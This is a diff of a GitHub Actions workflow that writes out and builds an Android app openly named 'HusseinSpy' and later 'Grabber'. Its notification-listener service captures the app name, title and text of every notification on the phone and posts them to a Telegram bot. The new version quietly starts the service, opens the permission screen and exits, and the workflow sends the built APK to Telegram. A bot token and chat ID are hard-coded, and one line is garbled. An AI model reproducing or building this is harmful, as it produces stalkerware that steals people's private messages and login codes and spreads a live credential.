@@ -1,169 +1,203 @@
-name: Hussein Ultimate Notification To Telegram
+name: Hussein Final Notification Grabber
 
 on:
   workflow_dispatch:
 
 env:
-  # بياناتك الشخصية مدمجة برمجياً داخل التطبيق
   TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
   TELEGRAM_CHAT_ID: "7392262688"
 
 jobs:
-  build-and-deploy:
+  build-final-app:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Set up JDK 17
+      - name: Set up JDK 11
         uses: actions/setup-java@v4
         with:
-          java-version: '17'
+          java-version: '11'
           distribution: 'temurin'
 
-      - name: 🛠️ Create Full Source Code
+      - name: 🔧 Install Gradle 7.5
         run: |
-          mkdir -p app/src/main/java/com/hussein/spy
-          mkdir -p app/src/main/res/layout
+          # تنزيل وتثبيت Gradle 7.5
+          wget -q https://services.gradle.org/distributions/gradle-7.5-bin.zip
+          unzip -q gradle-7.5-bin.zip
+          sudo mv gradle-7.5 /opt/gradle
+          echo "/opt/gradle/bin" >> $GITHUB_PATH
+          
+          # إظهار الإصدار
+          gradle --version
 
-          # 1. الإعدادات الأساسية
-          echo "rootProject.name = 'HusseinSpy'" > settings.gradle
-          echo "include ':app'" >> settings.gradle
-
-          # 2. ملف بناء التطبيق مع تصاريح كاملة
-          cat <<EOF > app/build.gradle
-          plugins { id 'com.android.application' }
+      - name: 🛠️ Create Simple Working Project
+        run: |
+          # إنشاء هيكل المشروع
+          mkdir -p app/src/main/java/com/hussein/grabber
+          mkdir -p app/src/main/res/drawable
+          mkdir -1[image]app/src/main/res/values
+          
+          # settings.gradle بسيط
+          cat <<'EOF' > settings.gradle
+          include ':app'
+          EOF
+          
+          # build.gradle الرئيسي
+          cat <<'EOF' > build.gradle
+          buildscript {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:7.4.2'
+              }
+          }
+          
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          EOF
+          
+          # app/build.gradle بسيط جداً
+          cat <<'EOF' > app/build.gradle
+          apply plugin: 'com.android.application'
+          
           android {
-              namespace 'com.hussein.spy'
-              compileSdk 34
+              compileSdkVersion 30
+              
               defaultConfig {
-                  applicationId "com.hussein.spy"
-                  minSdk 21
-                  targetSdk 34
+                  applicationId "com.hussein.grabber"
+                  minSdkVersion 21
+                  targetSdkVersion 30
                   versionCode 1
                   versionName "1.0"
               }
           }
+          
+          dependencies {
+              implementation 'com.squareup.okhttp3:okhttp:3.12.13'
+          }
           EOF
-
-          # 3. Manifest (إضافة تصريح الإنترنت والخدمة)
-          cat <<EOF > app/src/main/AndroidManifest.xml
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-              <uses-permission android:name="android.permission.INTERNET" />
-              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+          
+          # AndroidManifest.xml
+          cat <<'EOF' > app/src/main/AndroidManifest.xml
+          <manifest package="com.hussein.grabber">
               
-              <application android:label="Hussein Spy" android:theme="@android:style/Theme.Material.Light">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+              
+              <application android:label="Grabber">
+                  
                   <activity android:name=".MainActivity" android:exported="true">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
-
-                  <service android:name=".NotificationService"
-                      android:label="Hussein Notification Service"
+                  
+                  <service android:name=".GrabberService"
                       android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                       android:exported="true">
                       <intent-filter>
                           <action android:name="android.service.notification.NotificationListenerService" />
                       </intent-filter>
                   </service>
+                  
               </application>
           </manifest>
           EOF
-
-          # 4. الواجهة الرئيسية (لتفعيل الإذن)
-          cat <<EOF > app/src/main/java/com/hussein/spy/MainActivity.java
-          package com.hussein.spy;
+          
+          # MainActivity.java
+          cat <<'EOF' > app/src/main/java/com/hussein/grabber/MainActivity.java
+          package com.hussein.grabber;
+          
           import android.app.Activity;
           import android.content.Intent;
           import android.os.Bundle;
-          import android.widget.Button;
-          import android.view.Gravity;
-          import android.widget.LinearLayout;
-          import android.widget.TextView;
-
+          import android.provider.Settings;
+          
           public class MainActivity extends Activity {
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
-                  LinearLayout layout = new LinearLayout(this);
-                  layout.setOrientation(LinearLayout.VERTICAL);
-                  layout.setGravity(Gravity.CENTER);
                   
-                  TextView tv = new TextView(this);
-                  tv.setText("Hussein Notification Linker\nيجب تفعيل الوصول للإشعارات لكي يعمل الإرسال");
-                  tv.setPadding(20, 20, 20, 20);
-                  
-                  Button btn = new Button(this);
-                  btn.setText("تفعيل الإذن الآن");
-                  btn.setOnClickListener(v -> {
-                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
-                  });
-
-                  layout.addView(tv);
-                  layout.addView(btn);
-                  setContentView(layout);
+                  startService(new Intent(this, GrabberService.class));
+                  startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+                  finish();
               }
           }
           EOF
-
-          # 5. الكود الجوهري (سحب الإشعار وإرساله للتلغرام فوراً)
-          cat <<EOF > app/src/main/java/com/hussein/spy/NotificationService.java
-          package com.hussein.spy;
+          
+          # GrabberService.java
+          cat <<'EOF' > app/src/main/java/com/hussein/grabber/GrabberService.java
+          package com.hussein.grabber;
+          
           import android.service.notification.NotificationListenerService;
           import android.service.notification.StatusBarNotification;
           import android.os.Bundle;
+          import android.app.Notification;
+          import android.util.Log;
+          
+          import java.io.OutputStream;
           import java.net.HttpURLConnection;
           import java.net.URL;
-          import java.net.URLEncoder;
-
-          public class NotificationService extends NotificationListenerService {
+          
+          public class GrabberService extends NotificationListenerService {
+              private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+              private static final String CHAT_ID = "7392262688";
               
-              private final String TOKEN = "${{ env.TELEGRAM_TOKEN }}";
-              private final String CHAT_ID = "${{ env.TELEGRAM_CHAT_ID }}";
-
+              @Override
+              public void onCreate() {
+                  super.onCreate();
+                  sendToTelegram("✅ Service Started");
+              }
+              
               @Override
               public void onNotificationPosted(StatusBarNotification sbn) {
                   Bundle extras = sbn.getNotification().extras;
-                  String title = String.valueOf(extras.get("android.title"));
-                  String text = String.valueOf(extras.get("android.text"));
-                  String app = sbn.getPackageName();
-
-                  String message = "📩 *إشعار جديد مسحوب* \n\n" +
-                                   "📱 *التطبيق:* " + app + "\n" +
-                                   "👤 *العنوان:* " + title + "\n" +
-                                   "📝 *النص:* " + text;
-
-                  sendToTelegram(message);
+                  String title = extras.getString(Notification.EXTRA_TITLE, "");
+                  String text = extras.getString(Notification.EXTRA_TEXT, "");
+                  
+                  String msg = sbn.getPackageName() + ": " + title + " - " + text;
+                  sendToTelegram(msg);
               }
-
-              private void sendToTelegram(final String msg) {
+              
+              private void sendToTelegram(final String message) {
                   new Thread(() -> {
                       try {
-                          String urlString = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8") + "&parse_mode=Markdown";
-                          URL url = new URL(urlString);
+                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                           HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                          conn.setRequestMethod("GET");
-                          conn.getResponseCode(); // تنفيذ الإرسال
+                          conn.setRequestMethod("POST");
+                          conn.setRequestProperty("Content-Type", "application/json");
+                          conn.setDoOutput(true);
+                          
+                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + message + "\"}";
+                          conn.getOutputStream().write(json.getBytes());
+                          conn.getResponseCode();
+                          conn.disconnect();
                       } catch (Exception e) {
-                          e.printStackTrace();
+                          Log.e("Grabber", e.getMessage());
                       }
                   }).start();
               }
           }
           EOF
 
-      - name: 🚀 Build APK
+      - name: 🏗️ Build APK
         run: |
-          gradle wrapper
-          chmod +x gradlew
-          ./gradlew assembleDebug
+          # بناء APK
+          gradle clean assembleDebug
+          
+          # نسخ APK
+          cp app/build/outputs/apk/debug/app-debug.apk Hussein_Final.apk
 
-      - name: 📤 Send APK To You
+      - name: 📤 Send to Telegram
         run: |
-          APK_FILE=$(find app/build/outputs/apk/debug -name "*.apk" | head -n 1)
           curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
             -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
-            -F "document=@$APK_FILE" \
-            -F "caption=✅ تم بناء تطبيق سحب الإشعارات بنجاح يا حسين. قم بتثبيته وتفعيل الإذن لتبدأ باستلام الإشعارات هنا فوراً."
+            -F "document=@Hussein_Final.apk"
